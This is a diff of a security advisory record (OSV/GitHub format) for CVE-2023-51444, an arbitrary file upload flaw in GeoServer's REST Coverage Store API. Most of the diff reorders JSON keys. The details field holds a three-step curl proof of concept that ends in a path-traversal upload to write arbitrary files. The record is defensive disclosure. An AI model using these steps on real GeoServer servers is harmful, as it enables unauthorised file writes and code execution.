@@ -1,25 +1,123 @@
 {
-  "id": "GHSA-9v5q-2gwq-q9hq",
-  "summary": "Arbitrary file upload vulnerability in GeoServer's REST Coverage Store API",
-  "details": "### Summary\nAn arbitrary file upload vulnerability exists that enables an authenticated administrator with permissions to modify coverage stores through the REST Coverage Store API to upload arbitrary file contents to arbitrary file locations which can lead to remote code execution.\n\n### Details\nCoverage stores that are configured using relative paths use a GeoServer Resource implementation that has validation to prevent path traversal but coverage stores that are configured using absolute paths use a different Resource implementation that does not prevent path traversal.\n\n### PoC\nStep 1 (create sample coverage store):\ncurl -vXPUT -H\"Content-type:application/zip\" -u\"admin:geoserver\" --data-binary @polyphemus.zip \"http://localhost:8080/geoserver/rest/workspaces/sf/coveragestores/filewrite/file.imagemosaic\"\nStep 2 (switch store to absolute URL):\ncurl -vXPUT -H\"Content-Type:application/xml\" -u\"admin:geoserver\" -d\"<coverageStore><url>file:///{absolute path to data directory}/data/sf/filewrite</url></coverageStore>\" \"http://localhost:8080/geoserver/rest/workspaces/sf/coveragestores/filewrite\"\nStep 3 (upload arbitrary files):\ncurl -vH\"Content-Type:\" -u\"admin:geoserver\" --data-binary @file/to/upload \"http://localhost:8080/geoserver/rest/workspaces/sf/coveragestores/filewrite/file.a?filename=../../../../../../../../../../file/to/write\"\nSteps 1 & 2 can be combined into a single POST REST call if local write access to anywhere on the the file system that GeoServer can read is possible (e.g., the /tmp directory).\n\n### Impact\nThis vulnerability can lead to executing arbitrary code.  An administrator with limited privileges could also potentially exploit this to overwrite GeoServer security files and obtain full administrator privileges.\n\n### References\nhttps://osgeo-org.atlassian.net/browse/GEOS-11176\nhttps://github.com/geoserver/geoserver/pull/7222\n",
+  "affected": [
+    {
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/03/GHSA-9v5q-2gwq-q9hq/GHSA-9v5q-2gwq-q9hq.json"
+      },
+      "package": {
+        "ecosystem": "Maven",
+        "name": "org.geoserver:gs-platform",
+        "purl": "pkg:maven/org.geoserver/gs-platform"
+      },
+      "ranges": [
+        {
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "2.23.4"
+            }
+          ],
+          "type": "ECOSYSTEM"
+        }
+      ],
+      "versions": []
+    },
+    {
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/03/GHSA-9v5q-2gwq-q9hq/GHSA-9v5q-2gwq-q9hq.json"
+      },
+      "package": {
+        "ecosystem": "Maven",
+        "name": "org.geoserver:gs-restconfig",
+        "purl": "pkg:maven/org.geoserver/gs-restconfig"
+      },
+      "ranges": [
+        {
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "2.23.4"
+            }
+          ],
+          "type": "ECOSYSTEM"
+        }
+      ],
+      "versions": []
+    },
+    {
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/03/GHSA-9v5q-2gwq-q9hq/GHSA-9v5q-2gwq-q9hq.json"
+      },
+      "package": {
+        "ecosystem": "Maven",
+        "name": "org.geoserver:gs-platform",
+        "purl": "pkg:maven/org.geoserver/gs-platform"
+      },
+      "ranges": [
+        {
+          "events": [
+            {
+              "introduced": "2.24.0"
+            },
+            {
+              "fixed": "2.24.1"
+            }
+          ],
+          "type": "ECOSYSTEM"
+        }
+      ],
+      "versions": [
+        "2.24.0"
+      ]
+    },
+    {
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/03/GHSA-9v5q-2gwq-q9hq/GHSA-9v5q-2gwq-q9hq.json"
+      },
+      "package": {
+        "ecosystem": "Maven",
+        "name": "org.geoserver:gs-restconfig",
+        "purl": "pkg:maven/org.geoserver/gs-restconfig"
+      },
+      "ranges": [
+        {
+          "events": [
+            {
+              "introduced": "2.24.0"
+            },
+            {
+              "fixed": "2.24.1"
+            }
+          ],
+          "type": "ECOSYSTEM"
+        }
+      ],
+      "versions": [
+        "2.24.0"
+      ]
+    }
+  ],
   "aliases": [
     "CVE-2023-51444"
   ],
-  "modified": "2024-03-20T15:43:58Z",
-  "published": "2024-03-20T14:54:59Z",
-  "related": [
-    "CVE-2023-51444"
-  ],
   "database_specific": {
-    "nvd_published_at": "2024-03-20T15:15:07Z",
     "cwe_ids": [
       "CWE-20",
       "CWE-434"
     ],
-    "severity": "HIGH",
     "github_reviewed": true,
-    "github_reviewed_at": "2024-03-20T14:54:59Z"
+    "github_reviewed_at": "2024-03-20T14:54:59Z",
+    "nvd_published_at": "2024-03-20T15:15:07Z",
+    "severity": "HIGH"
   },
+  "details": "### Summary\nAn arbitrary file upload vulnerability exists that enables an authenticated administrator with permissions to modify coverage stores through the REST Coverage Store API to upload arbitrary file contents to arbitrary file locations which can lead to remote code execution.\n\n### Details\nCoverage stores that are configured using relative paths use a GeoServer Resource implementation that has validation to prevent path traversal but coverage stores that are configured using absolute paths use a different Resource implementation that does not prevent path traversal.\n\n### PoC\nStep 1 (create sample coverage store):\ncurl -vXPUT -H\"Content-type:application/zip\" -u\"admin:geoserver\" --data-binary @polyphemus.zip \"http://localhost:8080/geoserver/rest/workspaces/sf/coveragestores/filewrite/file.imagemosaic\"\nStep 2 (switch store to absolute URL):\ncurl -vXPUT -H\"Content-Type:application/xml\" -u\"admin:geoserver\" -d\"<coverageStore><url>file:///{absolute path to data directory}/data/sf/filewrite</url></coverageStore>\" \"http://localhost:8080/geoserver/rest/workspaces/sf/coveragestores/filewrite\"\nStep 3 (upload arbitrary files):\ncurl -vH\"Content-Type:\" -u\"admin:geoserver\" --data-binary @file/to/upload \"http://localhost:8080/geoserver/rest/workspaces/sf/coveragestores/filewrite/file.a?filename=../../../../../../../../../../file/to/write\"\nSteps 1 & 2 can be combined into a single POST REST call if local write access to anywhere on the the file system that GeoServer can read is possible (e.g., the /tmp directory).\n\n### Impact\nThis vulnerability can lead to executing arbitrary code.  An administrator with limited privileges could also potentially exploit this to overwrite GeoServer security files and obtain full administrator privileges.\n\n### References\nhttps://osgeo-org.atlassian.net/browse/GEOS-11176\nhttps://github.com/geoserver/geoserver/pull/7222\n",
+  "id": "GHSA-9v5q-2gwq-q9hq",
+  "modified": "2024-03-20T15:43:58Z",
+  "published": "2024-03-20T14:54:59Z",
   "references": [
     {
       "type": "WEB",
@@ -50,113 +148,15 @@
       "url": "https://osgeo-org.atlassian.net/browse/GEOS-11176"
     }
   ],
-  "affected": [
-    {
-      "package": {
-        "name": "org.geoserver:gs-platform",
-        "ecosystem": "Maven",
-        "purl": "pkg:maven/org.geoserver/gs-platform"
-      },
-      "ranges": [
-        {
-          "type": "ECOSYSTEM",
-          "events": [
-            {
-              "introduced": "0"
-            },
-            {
-              "fixed": "2.23.4"
-            }
-          ]
-        }
-      ],
-      "database_specific": {
-        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/03/GHSA-9v5q-2gwq-q9hq/GHSA-9v5q-2gwq-q9hq.json"
-      },
-      "versions": []
-    },
-    {
-      "package": {
-        "name": "org.geoserver:gs-restconfig",
-        "ecosystem": "Maven",
-        "purl": "pkg:maven/org.geoserver/gs-restconfig"
-      },
-      "ranges": [
-        {
-          "type": "ECOSYSTEM",
-          "events": [
-            {
-              "introduced": "0"
-            },
-            {
-              "fixed": "2.23.4"
-            }
-          ]
-        }
-      ],
-      "database_specific": {
-        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/03/GHSA-9v5q-2gwq-q9hq/GHSA-9v5q-2gwq-q9hq.json"
-      },
-      "versions": []
-    },
-    {
-      "package": {
-        "name": "org.geoserver:gs-platform",
-        "ecosystem": "Maven",
-        "purl": "pkg:maven/org.geoserver/gs-platform"
-      },
-      "ranges": [
-        {
-          "type": "ECOSYSTEM",
-          "events": [
-            {
-              "introduced": "2.24.0"
-            },
-            {
-              "fixed": "2.24.1"
-            }
-          ]
-        }
-      ],
-      "versions": [
-        "2.24.0"
-      ],
-      "database_specific": {
-        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/03/GHSA-9v5q-2gwq-q9hq/GHSA-9v5q-2gwq-q9hq.json"
-      }
-    },
-    {
-      "package": {
-        "name": "org.geoserver:gs-restconfig",
-        "ecosystem": "Maven",
-        "purl": "pkg:maven/org.geoserver/gs-restconfig"
-      },
-      "ranges": [
-        {
-          "type": "ECOSYSTEM",
-          "events": [
-            {
-              "introduced": "2.24.0"
-            },
-            {
-              "fixed": "2.24.1"
-            }
-          ]
-        }
-      ],
-      "versions": [
-        "2.24.0"
-      ],
-      "database_specific": {
-        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/03/GHSA-9v5q-2gwq-q9hq/GHSA-9v5q-2gwq-q9hq.json"
-      }
-    }
+  "related": [
+    "CVE-2023-51444"
   ],
   "schema_version": "1.6.0",
   "severity": [
     {
-      "type": "CVSS_V3",
-      "score": "CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H"
+      "score": "CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H",
+      "type": "CVSS_V3"
     }
-  ]
+  ],
+  "summary": "Arbitrary file upload vulnerability in GeoServer's REST Coverage Store API"
 }
